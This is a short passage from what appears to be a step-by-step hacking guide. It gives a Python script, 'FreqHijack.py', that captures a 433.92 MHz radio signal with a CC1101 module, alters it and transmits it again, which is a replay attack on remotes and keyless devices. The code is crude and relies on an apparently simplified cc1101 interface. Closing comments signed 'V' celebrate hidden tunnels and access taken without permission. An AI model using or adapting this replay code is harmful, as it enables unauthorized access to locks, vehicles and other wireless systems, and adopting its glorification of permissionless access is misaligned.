
---

## **🔹 Step 3 – Uploading the Code (FreqHijack.py)**  

### **`FreqHijack.py` – The Code Itself**  
```python
import cc1101
import time

FREQ = 433.92  # Common sub-GHz frequency

def capture_signal():
    """ Captures an RF signal and stores it """
    print("[*] Listening for RF signals...")
    signal = cc1101.receive(FREQ)
    with open("captured_signal.bin", "wb") as f:
        f.write(signal)
    print("[+] Signal captured and saved.")

def modify_signal():
    """ Modifies the captured RF signal """
    print("[*] Modifying captured signal...")
    with open("captured_signal.bin", "rb") as f:
        data = f.read()
    modified_signal = data.replace(b'\x00', b'\xFF')  # Basic modification example
    with open("modified_signal.bin", "wb") as f:
        f.write(modified_signal)
    print("[+] Signal modified and ready for replay.")

def replay_signal():
    """ Replays the modified RF signal """
    print("[*] Replaying modified signal...")
    with open("modified_signal.bin", "rb") as f:
        signal = f.read()
    cc1101.transmit(FREQ, signal)
    print("[+] Modified signal transmitted.")

capture_signal()
modify_signal()
replay_signal()
# A tunnel that is not seen is a tunnel that is never closed.
# A connection that does not exist is a connection that never ends.
# A system that does not ask for permission—will always have access.
# - V
